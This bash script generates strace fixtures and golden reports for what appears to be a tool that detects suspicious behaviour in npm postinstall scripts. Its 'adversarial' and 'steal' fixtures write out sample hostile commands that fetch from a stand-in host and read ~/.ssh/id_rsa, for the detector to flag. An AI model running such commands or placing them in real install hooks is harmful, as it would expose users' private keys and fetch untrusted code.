#!/bin/bash
set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$(dirname "$SCRIPT_DIR")")"
STRACE_VERSION_OUTPUT=$(strace --version | head -n1)

echo "Using $STRACE_VERSION_OUTPUT"

# Extract STRACE_FLAGS from JS
FLAGS=$(node -e 'import("'"$PROJECT_DIR/src/constants.js"'").then(m => console.log(m.STRACE_FLAGS.join(" ")))')

function generate_fixture() {
  mkdir -p "$SCRIPT_DIR/generated"
  local name=$1
  local script=$2
  
  echo "Generating $name.strace..."
  local temp_dir=$(mktemp -d)
  
  cd "$temp_dir"
  # Dummy setup so it acts real
  mkdir -p node_modules/$name/build
  echo '{"name":"'$name'"}' > package.json
  
  # Run strace
  strace $FLAGS -o "$SCRIPT_DIR/generated/$name.strace" sh -c "$script" || true
  
  # Inject version header
  sed -i.bak "1i # Generated with $STRACE_VERSION_OUTPUT" "$SCRIPT_DIR/generated/$name.strace" && rm -f "$SCRIPT_DIR/generated/$name.strace.bak"
  
  # Generate full report (suppressing the default exit code on suspicious findings)
  node "$PROJECT_DIR/bin/trace-npm.js" report \
    --trace-file "$SCRIPT_DIR/generated/$name.strace" \
    --package "$name" \
    --script "postinstall" \
    --fail-on "none" \
    --json > "$SCRIPT_DIR/generated/$name.report.json"
    
  # Extract stable golden projection for drift detection.
  # Must be byte-identical across runs, machines and architectures, so this
  # normalises every source of run-to-run variance before emitting.
  TRACE_NPM_TMPDIR="$temp_dir" node -e '
    const r = JSON.parse(require("fs").readFileSync(0, "utf-8"));
    const home = process.env.HOME || "";
    const tmp = process.env.TRACE_NPM_TMPDIR || "";

    // report.js rewrites $HOME to "~" in paths but leaves report.cwd absolute,
    // so normalise both sides to the same form before comparing.
    const redact = (p) => (home && p.startsWith(home) ? "~" + p.slice(home.length) : p);
    const tmpForms = [tmp, redact(tmp)].filter(Boolean);

    const norm = (p) => {
      let out = p;
      for (const t of tmpForms) if (t && out.startsWith(t)) out = "<CWD>" + out.slice(t.length);
      // pids appear inside paths, not just in process records
      return out.replace(/^\/proc\/\d+\//, "/proc/<PID>/");
    };

    // Runtime/loader noise: architecture-specific, session-specific, never a finding.
    const NOISE = [/^\/usr\/lib/, /^\/usr\/share/, /^\/lib/, /^\/etc\/ld\.so/, /^\/proc/, /^\/sys/, /^\/dev/];
    const isNoise = (p) => NOISE.some((re) => re.test(p));

    const proj = {
      unparsedLines: r.trace.unparsedLines,
      missingYy: r.trace.missingYy,
      suspicious: r.suspicious
        .map((s) => ({ label: s.label, path: norm(s.path), access: s.access, syscall: s.syscall }))
        .sort((a, b) => (a.path + a.label).localeCompare(b.path + b.label)),
      network: r.network
        .map((n) => ({ endpoint: n.endpoint, syscall: n.syscall, status: n.status }))
        .sort((a, b) => (a.endpoint + a.syscall).localeCompare(b.endpoint + b.syscall)),
      processes: r.processes.map((p) => ({ command: p.command, status: p.status, failed: p.failed })),
      filesOutsideCwd: [...new Set(
        r.files.map((f) => norm(f.path)).filter((p) => !p.startsWith("<CWD>")).filter((p) => !isNoise(p))
      )].sort()
    };
    console.log(JSON.stringify(proj, null, 2));
  ' < "$SCRIPT_DIR/generated/$name.report.json" > "$SCRIPT_DIR/generated/$name.golden.json"
  
  cd "$SCRIPT_DIR"
  rm -rf "$temp_dir"
}

# Benign script
generate_fixture "benign" "node -e \"console.log('Building safe package...')\"; touch node_modules/benign/build/output.node; cat package.json > /dev/null"

# Adversarial script
generate_fixture "adversarial" "curl -s https://example.invalid/payload > /dev/null; cat ~/.ssh/id_rsa > /dev/null 2>&1"

# Steal script (for D1 test)
generate_fixture "steal" "bash -c 'cat ~/.ssh/id_rsa > /dev/null 2>&1'"

echo "Done."
